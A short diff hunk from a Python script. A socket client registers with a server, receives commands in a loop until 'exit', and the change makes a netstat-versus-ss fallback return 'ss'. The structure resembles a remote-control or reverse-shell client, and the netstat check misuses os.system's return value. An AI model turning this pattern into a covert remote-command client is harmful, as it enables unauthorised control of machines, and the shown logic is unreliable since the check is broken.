@@ -36,7 +36,7 @@ clientSocket.send('Client Connected!'.encode())
 command = clientSocket.recv(4064).decode()
 
 using_netstat=os.system("{ netstat --version &> /dev/null && echo 1 ; } || echo 0")
-net_vs_ss = 'netstat' if using_netstat == 1 else 0
+net_vs_ss = 'netstat' if using_netstat == 1 else 'ss'
 
 # Continue receiving commands until server sends 'exit
 while command != 'exit':
